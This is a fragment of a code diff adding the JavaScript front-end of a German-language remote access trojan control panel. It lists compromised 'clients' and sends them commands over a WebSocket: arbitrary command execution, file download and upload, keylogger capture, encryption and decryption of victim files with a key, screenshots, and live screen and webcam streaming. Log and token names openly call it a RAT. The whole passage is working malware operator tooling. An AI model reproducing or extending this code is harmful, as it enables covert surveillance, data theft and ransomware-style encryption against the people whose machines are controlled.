+        if (e.ctrlKey || e.metaKey) {
+          // Multi-select with Ctrl/Cmd
+          toggleClientSelection(client.id);
+        } else {
+          // Single select
+          selectedClients.clear();
+          toggleClientSelection(client.id);
+        }
+        updateClientList(Array.from(document.querySelectorAll('.client-card')).map(el => ({
+          id: el.dataset.clientId,
+          hostname: el.querySelector('.font-medium').textContent,
+          ip: el.querySelector('.text-gray-300 span:last-child').textContent,
+          os: client.os
+        })));
+      });
+      
+      return div;
+    }
+
+    function getOSIcon(os) {
+      if (!os) return 'fas fa-desktop';
+      const osLower = os.toLowerCase();
+      if (osLower.includes('windows')) return 'fab fa-windows';
+      if (osLower.includes('linux')) return 'fab fa-linux';
+      if (osLower.includes('mac') || osLower.includes('darwin')) return 'fab fa-apple';
+      return 'fas fa-desktop';
+    }
+
+    function toggleClientSelection(clientId) {
+      if (selectedClients.has(clientId)) {
+        selectedClients.delete(clientId);
+      } else {
+        selectedClients.add(clientId);
+      }
+      updateSelectedCount();
+      updateClientVisuals();
+    }
+
+    function updateSelectedCount() {
+      selectedCount.textContent = selectedClients.size;
+    }
+
+    function updateClientVisuals() {
+      document.querySelectorAll('.client-card').forEach(card => {
+        const clientId = card.dataset.clientId;
+        const checkIcon = card.querySelector('.fa-check-circle');
+        
+        if (selectedClients.has(clientId)) {
+          card.classList.add('selected');
+          if (!checkIcon) {
+            const iconContainer = card.querySelector('.flex.items-center:last-child');
+            iconContainer.innerHTML = '<i class="fas fa-check-circle text-blue-400"></i>';
+          }
+        } else {
+          card.classList.remove('selected');
+          if (checkIcon) {
+            checkIcon.remove();
+          }
         }
       });
-    };
-
-    // Starte App, falls Token schon da (Auto-Login)
-    if (window._rat_token) {
-      window.initRatApp(window._rat_token);
     }
+
+    function requestClientList() {
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify({ action: 'get_clients' }));
+      }
+    }
+
+    // Command Handling
+    function setupCommandInput() {
+      commandInput.addEventListener('input', handleCommandInput);
+      commandInput.addEventListener('keydown', handleCommandKeydown);
+      commandInput.addEventListener('focus', showCommandSuggestions);
+      commandInput.addEventListener('blur', hideCommandSuggestions);
+    }
+
+    function handleCommandInput() {
+      const value = commandInput.value;
+      if (value.startsWith('/')) {
+        showCommandSuggestions();
+      } else {
+        hideCommandSuggestions();
+      }
+    }
+
+    function handleCommandKeydown(e) {
+      switch (e.key) {
+        case 'Enter':
+          if (!e.shiftKey) {
+            e.preventDefault();
+            sendCommandToClients();
+          }
+          break;
+        case 'ArrowUp':
+          navigateHistory(-1);
+          e.preventDefault();
+          break;
+        case 'ArrowDown':
+          navigateHistory(1);
+          e.preventDefault();
+          break;
+        case 'Tab':
+          e.preventDefault();
+          autocompleteCommand();
+          break;
+      }
+    }
+
+    function showCommandSuggestions() {
+      const value = commandInput.value.toLowerCase();
+      if (!value.startsWith('/')) {
+        hideCommandSuggestions();
+        return;
+      }
+      
+      const filtered = commands.filter(cmd => 
+        cmd.cmd.toLowerCase().includes(value) || 
+        cmd.desc.toLowerCase().includes(value)
+      );
+      
+      if (filtered.length === 0) {
+        hideCommandSuggestions();
+        return;
+      }
+      
+      commandSuggestions.innerHTML = '';
+      filtered.forEach(cmd => {
+        const div = document.createElement('div');
+        div.className = 'suggestion-item px-4 py-2 cursor-pointer';
+        div.innerHTML = `
+          <div class="flex justify-between items-center">
+            <span class="font-medium text-blue-400">${cmd.cmd}</span>
+            <span class="text-sm text-gray-400">${cmd.desc}</span>
+          </div>
+        `;
+        
+        div.addEventListener('click', () => {
+          commandInput.value = cmd.cmd + ' ';
+          commandInput.focus();
+          hideCommandSuggestions();
+        });
+        
+        commandSuggestions.appendChild(div);
+      });
+      
+      commandSuggestions.classList.remove('hidden');
+    }
+
+    function hideCommandSuggestions() {
+      setTimeout(() => {
+        commandSuggestions.classList.add('hidden');
+      }, 150);
+    }
+
+    function autocompleteCommand() {
+      const value = commandInput.value.toLowerCase();
+      const matches = commands.filter(cmd => cmd.cmd.toLowerCase().startsWith(value));
+      
+      if (matches.length === 1) {
+        commandInput.value = matches[0].cmd + ' ';
+      }
+    }
+
+    function navigateHistory(direction) {
+      if (commandHistory.length === 0) return;
+      
+      historyIndex += direction;
+      historyIndex = Math.max(-1, Math.min(historyIndex, commandHistory.length - 1));
+      
+      if (historyIndex === -1) {
+        commandInput.value = '';
+      } else {
+        commandInput.value = commandHistory[historyIndex];
+      }
+    }
+
+    function sendCommandToClients() {
+      const command = commandInput.value.trim();
+      if (!command || selectedClients.size === 0) {
+        showNotification('Bitte wähle einen Client aus und gib einen Befehl ein', 'warning');
+        return;
+      }
+      
+      // Add to history
+      if (commandHistory[commandHistory.length - 1] !== command) {
+        commandHistory.push(command);
+        if (commandHistory.length > 100) {
+          commandHistory.shift();
+        }
+      }
+      historyIndex = -1;
+      
+      // Parse and send command
+      const parsedCommand = parseCommand(command);
+      
+      selectedClients.forEach(clientId => {
+        const payload = {
+          target_id: clientId,
+          ...parsedCommand
+        };
+        
+        if (ws && ws.readyState === WebSocket.OPEN) {
+          ws.send(JSON.stringify(payload));
+        }
+      });
+      
+      logOutput(`Befehl gesendet an ${selectedClients.size} Client(s): ${command}`, 'command');
+      commandInput.value = '';
+      hideCommandSuggestions();
+    }
+
+    function parseCommand(command) {
+      const parts = command.trim().split(' ');
+      const action = parts[0].startsWith('/') ? parts[0].substring(1) : parts[0];
+      const args = parts.slice(1).join(' ');
+      
+      const result = { action };
+      
+      switch (action) {
+        case 'exec':
+          result.command = args;
+          break;
+        case 'download':
+          result.path = args;
+          break;
+        case 'upload':
+          result.filename = args;
+          break;
+        case 'ls':
+          result.path = args || '.';
+          break;
+        case 'cd':
+          result.path = args || '.';
+          break;
+        case 'history':
+          result.limit = parseInt(args) || 50;
+          break;
+        case 'keylogger':
+          result.count = parseInt(args) || 100;
+          break;
+        case 'encrypt':
+        case 'decrypt':
+          const pathAndKey = args.split(' ');
+          result.path = pathAndKey[0] || '.';
+          if (action === 'decrypt' && pathAndKey[1]) {
+            result.key_hex = pathAndKey[1];
+          }
+          break;
+        default:
+          if (args) {
+            result.argument = args;
+          }
+      }
+      
+      return result;
+    }
+
+    // Media Handling
+    function displayScreenshot(base64Data) {
+      screenshotImg.src = `data:image/png;base64,${base64Data}`;
+      screenshotContainer.classList.remove('hidden');
+      mediaPlaceholder.classList.add('hidden');
+      
+      showNotification('Screenshot empfangen', 'success');
+    }
+
+    function displayScreenFrame(data) {
+      if (!screenCanvas) return;
+      
+      const ctx = screenCanvas.getContext('2d');
+      const img = new Image();
+      
+      img.onload = function() {
+        screenCanvas.width = img.width;
+        screenCanvas.height = img.height;
+        ctx.drawImage(img, 0, 0);
+      };
+      
+      // Assuming the frame data comes after this message
+      screenStreamContainer.classList.remove('hidden');
+      mediaPlaceholder.classList.add('hidden');
+      screenStatus.textContent = `Stream aktiv - ${data.width}x${data.height}`;
+    }
+
+    function displayWebcamFrame(data) {
+      webcamContainer.classList.remove('hidden');
+      mediaPlaceholder.classList.add('hidden');
+      webcamStatus.textContent = 'Webcam Stream aktiv';
+    }
+
+    function downloadFile(filename, base64Data) {
+      const byteCharacters = atob(base64Data);
+      const byteNumbers = new Array(byteCharacters.length);
+      for (let i = 0; i < byteCharacters.length; i++) {
+        byteNumbers[i] = byteCharacters.charCodeAt(i);
+      }
+      const byteArray = new Uint8Array(byteNumbers);
+      const blob = new Blob([byteArray]);
+      
+      const url = window.URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = filename;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      window.URL.revokeObjectURL(url);
+      
+      showNotification(`Datei heruntergeladen: ${filename}`, 'success');
+    }
+
+    // File Upload
+    function setupFileUpload() {
+      uploadBtn.addEventListener('click', () => fileUpload.click());
+      fileUpload.addEventListener('change', handleFileUpload);
+    }
+
+    function handleFileUpload(event) {
+      const files = Array.from(event.target.files);
+      if (files.length === 0 || selectedClients.size === 0) return;
+      
+      files.forEach(file => {
+        const reader = new FileReader();
+        reader.onload = function(e) {
+          const base64Data = e.target.result.split(',')[1];
+          
+          selectedClients.forEach(clientId => {
+            const payload = {
+              action: 'upload',
+              target_id: clientId,
+              filename: file.name,
+              data: base64Data
+            };
+            
+            if (ws && ws.readyState === WebSocket.OPEN) {
+              ws.send(JSON.stringify(payload));
+            }
+          });
+          
+          showNotification(`Datei hochgeladen: ${file.name}`, 'success');
+        };
+        reader.readAsDataURL(file);
+      });
+      
+      event.target.value = ''; // Reset file input
+    }
+
+    // Event Listeners
+    function setupEventListeners() {
+      // Login form
+      loginForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const username = document.getElementById('login-username').value;
+        const password = document.getElementById('login-password').value;
+        await login(username, password);
+      });
+      
+      // Send command
+      sendCommand.addEventListener('click', sendCommandToClients);
+      
+      // Quick actions
+      document.querySelectorAll('.quick-action').forEach(btn => {
+        btn.addEventListener('click', () => {
+          commandInput.value = btn.dataset.command;
+          commandInput.focus();
+        });
+      });
+      
+      // Control buttons
+      document.getElementById('refresh-clients').addEventListener('click', requestClientList);
+      
+      document.getElementById('select-all-clients').addEventListener('click', () => {
+        const allClientIds = Array.from(document.querySelectorAll('.client-card'))
+          .map(card => card.dataset.clientId);
+        selectedClients.clear();
+        allClientIds.forEach(id => selectedClients.add(id));
+        updateSelectedCount();
+        updateClientVisuals();
+      });
+      
+      document.getElementById('clear-output').addEventListener('click', () => {
+        outputArea.innerHTML = `
+          <div class="text-gray-400 text-center py-8">
+            <i class="fas fa-terminal text-3xl mb-3"></i>
+            <p>Bereit für Befehle...</p>
+            <p class="text-xs mt-2">Verwende / für Befehlsvorschläge</p>
+          </div>
+        `;
+      });
+      
+      document.getElementById('copy-output').addEventListener('click', () => {
+        const text = outputArea.innerText;
+        navigator.clipboard.writeText(text).then(() => {
+          showNotification('Ausgabe in Zwischenablage kopiert', 'success');
+        });
+      });
+      
+      document.getElementById('export-logs').addEventListener('click', () => {
+        const text = outputArea.innerText;
+        const blob = new Blob([text], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `rat-logs-${new Date().toISOString().slice(0, 19)}.txt`;
+        a.click();
+        URL.revokeObjectURL(url);
+        showNotification('Logs exportiert', 'success');
+      });
+      
+      // Media controls
+      document.getElementById('stop-screen-stream').addEventListener('click', () => {
+        commandInput.value = '/screenstream_stop';
+        sendCommandToClients();
+        screenStreamContainer.classList.add('hidden');
+        if (mediaPlaceholder && !webcamContainer.classList.contains('hidden') && !screenshotContainer.classList.contains('hidden')) {
+          mediaPlaceholder.classList.remove('hidden');
+        }
+      });
+      
+      document.getElementById('stop-webcam').addEventListener('click', () => {
+        commandInput.value = '/webcam_stop';
+        sendCommandToClients();
+        webcamContainer.classList.add('hidden');
+        if (mediaPlaceholder && !screenStreamContainer.classList.contains('hidden') && !screenshotContainer.classList.contains('hidden')) {
+          mediaPlaceholder.classList.remove('hidden');
+        }
+      });
+      
+      document.getElementById('download-screenshot').addEventListener('click', () => {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        const img = screenshotImg;
+        
+        canvas.width = img.naturalWidth;
+        canvas.height = img.naturalHeight;
+        ctx.drawImage(img, 0, 0);
+        
+        canvas.toBlob(blob => {
+          const url = URL.createObjectURL(blob);
+          const a = document.createElement('a');
+          a.href = url;
+          a.download = `screenshot-${new Date().toISOString().slice(0, 19)}.png`;
+          a.click();
+          URL.revokeObjectURL(url);
+        });
+      });
+      
+      setupCommandInput();
+      setupFileUpload();
+    }
+
+    function showLogin() {
+      loginOverlay.classList.remove('hidden');
+      mainApp.classList.add('hidden');
+      isAuthenticated = false;
+    }
+
+    // Initialize Application
+    function init() {
+      setupEventListeners();
+      
+      // Check for existing token
+      const token = localStorage.getItem('rat_token');
+      if (token) {
+        loginOverlay.classList.add('hidden');
+        mainApp.classList.remove('hidden');
+        isAuthenticated = true;
+        connectWebSocket();
+      }
+      
+      // Auto-refresh client list every 30 seconds
+      setInterval(() => {
+        if (isAuthenticated && ws && ws.readyState === WebSocket.OPEN) {
+          requestClientList();
+        }
+      }, 30000);
+    }
+
+    // Start the application
+    init();
   </script>
 </body>
 </html>
